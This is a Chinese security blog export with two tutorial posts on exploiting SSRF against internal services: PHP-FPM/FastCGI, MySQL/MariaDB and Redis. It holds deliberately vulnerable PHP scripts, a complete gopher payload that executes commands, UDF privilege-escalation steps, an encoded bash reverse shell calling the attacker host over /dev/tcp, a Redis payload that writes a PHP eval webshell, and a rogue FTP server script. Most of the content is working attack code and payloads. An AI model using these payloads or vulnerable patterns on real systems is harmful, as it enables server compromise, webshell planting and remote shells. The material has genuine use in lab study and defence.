<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">;listen = /run/php/php7.2-fpm.sock</span></span><br><span class="line"><span class="attr">listen</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：这里如果设置监听为0.0.0.0:9000就在产生php-fpm未授权访问漏洞，此时攻击者可以直接与9000端口上的php-fpm进行通信，进而可以实现任意代码执行。</p>
</blockquote>
<p>下面修改权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 777 /run/php/php7.2-fpm.sock</span><br></pre></td></tr></table></figure>
<p>打开nginx的配置文件 <code>/etc/nginx/sites-available/default</code> 修改相应部分的配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80<span class="comment">; #监听80端口，接收http请求</span></span><br><span class="line">    server_name  hacktop.com<span class="comment">; #就是网站地址</span></span><br><span class="line">    root /usr/share/nginx/html/<span class="comment">; # 准备存放代码工程的路径</span></span><br><span class="line">    <span class="comment">#路由到网站根目录www.example.com时候的处理</span></span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.php<span class="comment">; #跳转到 hacktop.com/index.php</span></span><br><span class="line">        autoindex on<span class="comment">;</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">#当请求网站下php文件的时候，反向代理到php-fpm</span></span><br><span class="line">   location ~ \.php$ &#123;</span><br><span class="line">            root html<span class="comment">;</span></span><br><span class="line">            fastcgi_split_path_info ^(.+\.php)(/.+)$<span class="comment">;</span></span><br><span class="line">            fastcgi_pass        127.0.0.1:9000<span class="comment">;</span></span><br><span class="line">            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name<span class="comment">;</span></span><br><span class="line">            fastcgi_index       index.php<span class="comment">;</span></span><br><span class="line">            include             fastcgi_params<span class="comment">;</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h4><p>配置完成后查看一下php-fpm的安装位置，然后启动</p>
<p><img src="https://i.loli.net/2021/12/01/Qapy8URsukYBEvb.png" alt="image-20211201132107539"></p>
<p>重新启动Nginx</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure>
<p>然后检查nginx是否正确启动 <code>systemctl status nginx</code></p>
<p><img src="https://i.loli.net/2021/12/01/4RfhY6kMr8nsejq.png" alt="image-20211201132738682"></p>
<p>检查php-fpm是否正确启动 <code>ps -elf | grep php-fpm</code></p>
<p><img src="https://i.loli.net/2021/12/01/MFr8GUbTiwAladE.png" alt="image-20211201132859864"></p>
<p>这里就可以看出上面所说的存在一个master进程和多个worker进程</p>
<p>下面将<code>/usr/share/nginx/html/</code>（nginx Web目录）下的文件删除，新建一个index.php。</p>
<p>内容可以写上<code>&lt;?php phpinfo(); ?&gt;</code>用来检查各项是否正常运行，如果页面为空，查看这篇<a href="https://blog.csdn.net/feiniao8651/article/details/52768911">文章</a>解决。</p>
<p><img src="https://i.loli.net/2021/12/01/fzoOswx7UDTQPcB.png" alt="image-20211201133404402"></p>
<p>其中Sever API 处和上图一样说明运行正确，然后在目录下新建ssrf.php 内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curl</span> = curl_init(<span class="variable">$url</span>);    </span><br><span class="line">    <span class="comment">//第二种初始化curl的方式</span></span><br><span class="line">    <span class="comment">//$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET[&#x27;url&#x27;]); </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*进行curl配置*/</span></span><br><span class="line">    curl_setopt(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出HTTP头</span></span><br><span class="line">    <span class="variable">$responseText</span> = curl_exec(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="comment">//var_dump(curl_error($curl) );//如果执行curl过程中出现异常，可打开此开关，以便查看异常内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$responseText</span>;</span><br><span class="line">    curl_close(<span class="variable">$curl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该代码为一个ssrf漏洞的示例代码，可以访问<code>/ssrf.php?url=http://www.baidu.com</code>进行测试，若能实现跳转到百度的页面，或包含百度的页面即SSRF环境搭建成功</p>
<p><img src="https://i.loli.net/2021/12/01/g5UJGaymtFPMCLB.png" alt="image-20211201133950257"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在这里就直接使用Gopherus生成payload</p>
<p><img src="https://i.loli.net/2021/12/01/zCbsJtucid5ZGjW.png" alt="image-20211201134731583"></p>
<p>对生成的payload再次进行URL编码，放入URL参数浏览器请求如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hacktop.com/ssrf.php?url=gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%250C%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%251FSCRIPT_FILENAME/usr/share/nginx/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>
<p>成功执行命令</p>
<p><img src="https://i.loli.net/2021/12/01/yE3IvaucLhPk8xt.png" alt="image-20211201135040353"></p>
<h2 id="SSRF利用MySQL未授权攻击"><a href="#SSRF利用MySQL未授权攻击" class="headerlink" title="SSRF利用MySQL未授权攻击"></a>SSRF利用MySQL未授权攻击</h2><h3 id="MySQL通信协议"><a href="#MySQL通信协议" class="headerlink" title="MySQL通信协议"></a>MySQL通信协议</h3><h4 id="MySQL连接方式"><a href="#MySQL连接方式" class="headerlink" title="MySQL连接方式"></a>MySQL连接方式</h4><p>MySQL分为服务端和客户端，客户端连接服务器使存在三种方法：</p>
<blockquote>
<ul>
<li>Unix套接字</li>
<li>内存共享/命名管道</li>
<li>TCP/IP套接字</li>
</ul>
</blockquote>
<ul>
<li>在Linux或者Unix环境下，当我们输入<code>mysql –uroot –proot</code>登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。</li>
<li>在Windows系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。</li>
<li><code>TCP/IP</code>套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入<code>mysql –h127.0.0.1 –uroot –proot</code>时就是要TCP/IP套接字。所以当我们需要抓取mysql通信数据包时必须使用<code>TCP/IP</code>套接字连接。</li>
</ul>
<h4 id="MySQL认证过程"><a href="#MySQL认证过程" class="headerlink" title="MySQL认证过程"></a>MySQL认证过程</h4><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p>
<p>MySQL客户端与服务器的交互主要分为两个阶段：<code>Connection Phase</code>（连接阶段或者叫认证阶段）和<code>Command Phase</code>（命令阶段）。在连接阶段包括握手包和认证包，这里我们不详细说明握手包，主要关注认证数据包。</p>
<h3 id="漏洞利用-查询数据库"><a href="#漏洞利用-查询数据库" class="headerlink" title="漏洞利用-查询数据库"></a>漏洞利用-查询数据库</h3><p><strong>实验环境：</strong></p>
<blockquote>
<p>系统：Ubuntu 20.04.3 LTS</p>
<p>数据库：MariaDB 10.3.31</p>
<p>（mysql没有实验成功，可能是版本的问题）</p>
</blockquote>
<h4 id="配置空密码用户"><a href="#配置空密码用户" class="headerlink" title="配置空密码用户"></a>配置空密码用户</h4><p>首先我们需要配置一个空密码的用户</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 创建用户</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;admin&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"># 授予权限</span><br><span class="line">GRANTUSAGE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;admin&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"># 刷新权限表</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
<h4 id="抓取MySQL数据包"><a href="#抓取MySQL数据包" class="headerlink" title="抓取MySQL数据包"></a>抓取MySQL数据包</h4><p>首先，开一个窗口，<code>tcpdump -i lo port 3306 -w mysql.pcapng</code>，开始抓取3306的数据包。</p>
<p><img src="https://i.loli.net/2021/12/01/ZvkBgcTz5hwH6Mq.png" alt="image-20211201210243808"></p>
<p>然后在另一个窗口，开启MySQL终端，查询一些信息。最后记得<code>exit;</code>，不然会出问题。</p>
<p><img src="https://i.loli.net/2021/12/01/nvoQl29bxypuXtS.png" alt="image-20211201213500304"></p>
<p>中止 tcpdump 使用 Wireshark 打开 <code>mysql.pcapng</code> 数据包，追踪 TCP 流</p>
<p><img src="https://i.loli.net/2021/12/01/hmQSB3xTNMZqkLb.png" alt="image-20211201214035748"></p>
<p>然后提取<code>request</code>包，并且显示为原始数据（Raw）</p>
<p><img src="https://i.loli.net/2021/12/01/Sh8B1zoFIpZ75Xg.png" alt="image-20211201214415615"></p>
<p>将其整理成 1 行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bd00000184a6bf20000000012d000000000000000000000000000000000000000d00000061646d696e00006d7973716c5f6e61746976655f70617373776f7264007f035f6f73054c696e75780c5f636c69656e745f6e616d650a6c69626d617269616462045f7069640534313534390f5f636c69656e745f76657273696f6e06332e312e3134095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c0c5f7365727665725f686f7374093132372e302e302e31210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031120000000353454c45435420444154414241534528290600000002666c6167730f0000000373686f77206461746162617365730c0000000373686f77207461626c65730600000004666c616700130000000373656c656374202a2066726f6d20666c61670100000001</span><br></pre></td></tr></table></figure>
<h4 id="生成-gopher-数据流"><a href="#生成-gopher-数据流" class="headerlink" title="生成 gopher 数据流"></a>生成 gopher 数据流</h4><p>然后使用如下的 Python3 脚本将数据转化为 url 编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">results</span>(<span class="params">s</span>):</span></span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s=sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(results(s))</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/12/01/dhtsWkjgfHJ341p.png" alt="image-20211201215230891"></p>
<p>本地 curl 请求这个 gopher 协议的数据包看看</p>
<p><img src="https://i.loli.net/2021/12/01/AC1rSjyPcEweBv2.png" alt="image-20211201215553354"></p>
<p>将生成的payload再进行URL编码，结合SSRF漏洞进行利用</p>
<p><img src="https://i.loli.net/2021/12/01/JvM8jOt9CRXb3EH.png" alt="image-20211201215924201"></p>
<h3 id="漏洞利用-UDF提权"><a href="#漏洞利用-UDF提权" class="headerlink" title="漏洞利用-UDF提权"></a>漏洞利用-UDF提权</h3><blockquote>
<p>提权前需要注意：</p>
<ul>
<li>mysql（mariadb）必须使用root用户启动（不通过service或者systemctl）</li>
<li><code>secure_file_priv</code>变量的值需要为空</li>
</ul>
</blockquote>
<h4 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h4><p>首先来寻找 MySQL 的插件目录，原生的 MySQL 命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uadmin -e <span class="string">&quot;show variables like &#x27;%plugin%&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后tcpdump 监听，使用 Wirshark 分析导出原始数据。这里为了方便就直接查询了，步骤和上面是一样的。</p>
<p><img src="https://i.loli.net/2021/12/02/VGhrYdHMuFK9AWp.png" alt="image-20211202124657883"></p>
<h4 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h4><p>拿到 MySQL 的插件目录为：<code>/usr/lib/x86_64-linux-gnu/mariadb19/plugin/</code></p>
<p>接着来写入动态链接库，原生的 MySQL 命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 因为 payload 太长 这里就先进入 MySQL 控制台</span></span><br><span class="line">$ mysql -h127.0.0.1 -uroot</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SELECT 0x7f454c4602...(省略大量payload)...0000000 INTO DUMPFILE <span class="string">&#x27;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于 UDF 提权的 UDF 命令，推荐参考国光大佬的这个 UDF 提权辅助页面：</p>
<p><a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
</blockquote>
<p>tcpdump 监听到的原始数据后，转换 gopher 协议，URL编码后，SSRF 攻击写入动态链接库。</p>
<p><img src="https://i.loli.net/2021/12/02/6ygfw4p97OJ2S1A.png" alt="image-20211202125541235"></p>
<p> 可以看到udf.so 已经成功写入到 MySQL 的插件目录下了</p>
<p><img src="https://i.loli.net/2021/12/02/napwP5A6x9WGftr.png" alt="image-20211202125633560"></p>
<p>以此类推，创建自定义函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e <span class="string">&quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>
<p>最后通过创建的自定义函数并执行系统命令将 shell 弹出来，原生命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e <span class="string">&quot;select sys_eval(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyMy4yNDEvNDQ0NCAwPiYx|base64 -d|bash -i&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<p>测试过程中默认情况下弹不出来，所以这里将原始的 bash 反弹 shell 命令给编码了：</p>
<p><img src="https://i.loli.net/2021/12/02/I5YukSqGHNZX4PJ.png" alt="image-20211202134310277"></p>
<blockquote>
<p>这里使用的是国光大佬的命令执行辅助工具：</p>
<p><a href="https://www.sqlsec.com/tools.html">https://www.sqlsec.com/tools.html</a></p>
</blockquote>
<p>tcpdump 监听到的原始数据后，转换 gopher 协议，URL二次编码请求一下，然后 SSRF 攻击成功弹出 shell。</p>
<p><img src="https://i.loli.net/2021/12/02/lZxyD2iRTCBGJuh.png" alt="image-20211202135909572"></p>
<blockquote>
<p>上述payload，除了写入动态链接库外，其他的都可以使用Gopherus工具生成</p>
<p><img src="https://i.loli.net/2021/12/02/KXQfLtb3hC84J7G.png" alt="image-20211202140513352"></p>
</blockquote>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://bbs.ichunqiu.com/thread-58455-1-1.html">SSRF系列之攻击FastCGI_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></li>
<li><a href="https://www.cnblogs.com/itbsl/p/9828776.html">CGI 和 FastCGI 协议的运行原理 - itbsl - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.freebuf.com/articles/web/263342.html">利用SSRF攻击内网FastCGI协议 - FreeBuf网络安全行业门户</a></li>
<li><a href="https://www.sqlsec.com/2021/05/ssrf.html">手把手带你用 SSRF 打穿内网 | 国光 (sqlsec.com)</a></li>
<li><a href="https://paper.seebug.org/510/">SSRF To RCE in MySQL (seebug.org)</a></li>
<li><a href="https://coomrade.github.io/2018/10/28/SSRF攻击MySQL/">SSRF攻击MySQL | C0mRaDe’s Blog (coomrade.github.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF服务端请求伪造</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>利用SSRF渗透内网主机·下</title>
    <url>/post/3ed986fb.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="FTP协议"><a href="#FTP协议" class="headerlink" title="FTP协议"></a>FTP协议</h2><p>FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。FTP 协议包括两个组成部分，其一为 FTP 服务器，其二为 FTP 客户端。其中 FTP 服务器用来存储文件，用户可以使用 FTP 客户端通过 FTP 协议访问位于 FTP 服务器上的资源。在开发网站的时候，通常利用 FTP 协议把网页或程序传到 Web 服务器上。此外，由于 FTP 传输效率非常高，在网络上传输大的文件时，一般也采用该协议。</p>
<p>默认情况下 FTP 协议使用 TCP 端口中的 20 和 21 这两个端口，其中 20 用于传输数据，21 用于传输控制信息。但是，是否使用 20 作为传输数据的端口与 FTP 使用的传输模式有关，如果采用主动模式，那么数据传输端口就是 20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。</p>
<h3 id="主动模式与被动模式"><a href="#主动模式与被动模式" class="headerlink" title="主动模式与被动模式"></a>主动模式与被动模式</h3><p>FTP会话包含了两个通道，控制通道和数据传输通道，FTP的工作有两种模式，一种是主动模式，一种是被动模式，以FTP Server为参照：主动模式，服务器主动连接客户端传输；被动模式，等待客户端的连接。</p>
<h4 id="主动模式（Port）"><a href="#主动模式（Port）" class="headerlink" title="主动模式（Port）"></a>主动模式（Port）</h4><p>FTP客户端连接到FTP服务器的21号端口，发送用户名和密码，客户端随机开放一个高位端口（1024以上），发送PORT命令到FTP服务器，告知服务器客户端采用主动模式并开放端口，FTP服务器收到PORT主动模式命令和端口后，通过服务器的20号端口和客户端开放的端口连接，发送数据，原理如图所示。</p>
<p><img src="https://i.loli.net/2021/12/03/M6Nc1QDHywJuSL3.png" alt="Untitled Diagram.drawio"></p>
<h4 id="被动模式（Passive）"><a href="#被动模式（Passive）" class="headerlink" title="被动模式（Passive）"></a>被动模式（Passive）</h4><p>FTP客户端连接到FTP服务器所监听的21端口，发送用户名和密码，发送PASV命令到FTP服务器，服务器载本地随机开放一个端口（1024以上），然后把开放的端口告知客户端，而后客户端再连接到服务器开放的端口进行数据传输，原理如图所示。（注：PASV是Passive的缩写，被动模式）</p>
<p><img src="https://i.loli.net/2021/12/03/8fwAYyZ5gKNnmWU.png" alt="Untitled Diagram.drawio (2)"></p>
<p>这里的主动和被动是相对与FTP Server端而判断的。</p>
<p>无论是主动还是被动模式，首先的控制通道都是先建立起来，只是在数据传输模式上的区别。</p>
<blockquote>
<p>注：绝大部分互联网应用都是被动模式</p>
<p>因为大部分客户端都是在路由器后面，没有独立的公网IP地址，服务器想要主动连接客户端，难度太大，在现在真实的互联网环境里面几乎是不可能完成的任务。</p>
</blockquote>
<p>可见，在被动方式中，FTP 客户端和服务端的数据传输端口是由服务端指定的，而且还有一点是很多地方没有提到的，实际上除了端口，服务器的地址也是可以被指定的。由于 FTP 和 HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">227 Entering Passive Mode(192,168,9,2,4,8)</span><br></pre></td></tr></table></figure>
<p>227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语，而 <code>(192,168,9,2,4,8)</code> 代表让客户端到连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口。</p>
<p>这样，假如我们指定 <code>(127,0,0,1,0,9000)</code> ，那么便可以将地址和端口指到 127.0.0.1:9000，也就是本地的 9000 端口。同时由于 FTP 的特性，其会把传输的数据原封不动的发给本地的 9000 端口，不会有任何的多余内容。如果我们将传输的数据换为特定的 Payload 数据，那我们便可以攻击内网特定端口上的应用了。在这整个过程中，FTP 只起到了一个重定向 Payload 的内容。</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote>
<p>攻击机：Kali —— 192.168.123.241</p>
<p>受害者：Ubuntu —— 192.168.123.189（运行服务“Redis、MySQL、PHP-FPM）</p>
</blockquote>
<p>下面是一个含有漏洞的PHP脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>file_put_contents () 函数把<strong>一个字符串写入文件中。</strong>与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p>
<p><code>file_put_contents</code>函数使用前需要将<code>php.ini</code>的<code>allow_url_fopen</code>设置为ON。</p>
<p>这个点是存在WebShell写入漏洞的，但是在不能写文件的环境下该如何利用呢？那么可以利用SSRF进行攻击。</p>
<p>但 <code>file_get_contents</code> 和 <code>file_put_contents</code> 不支持gopher和dict协议。</p>
<p>那么我们如何才能实现 RCE 呢？那么这个时候我们便可以从 FTP 的被动模式入手，通过 SSRF 攻击内网应用。</p>
<h2 id="SSRF利用FTP协议攻击Redis"><a href="#SSRF利用FTP协议攻击Redis" class="headerlink" title="SSRF利用FTP协议攻击Redis"></a>SSRF利用FTP协议攻击Redis</h2><p>假设内网中存在 Redis 并且可以未授权访问的话，我们也可以直接攻击 Redis，实现写入 Webshell、SSH 秘钥、计划任务等。</p>
<p>首先编写脚本生成攻击 Redis 的 Payload（也可以使用Gopherus）生成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;whoami\&quot;]);?&gt;\n\n&quot;</span>	<span class="comment"># 一句话木马</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>    <span class="comment"># 此处也可以填入Redis的密码, 在不存在Redis未授权的情况下适用</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure>
<p>得到payload只选取<code>_</code>的部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
<p>然后还是在攻击机上运行 evil_ftp.py 启动一个伪 FTP 服务：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># evil_ftp.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))		<span class="comment"># ftp服务绑定23号端口</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,6379)\n&#x27;</span>) <span class="comment">#STOR / (2) </span></span><br><span class="line"><span class="comment"># &quot;127,0,0,1&quot;Redis服务为受害者本地，&quot;6379&quot;为为Redis服务的端口号</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
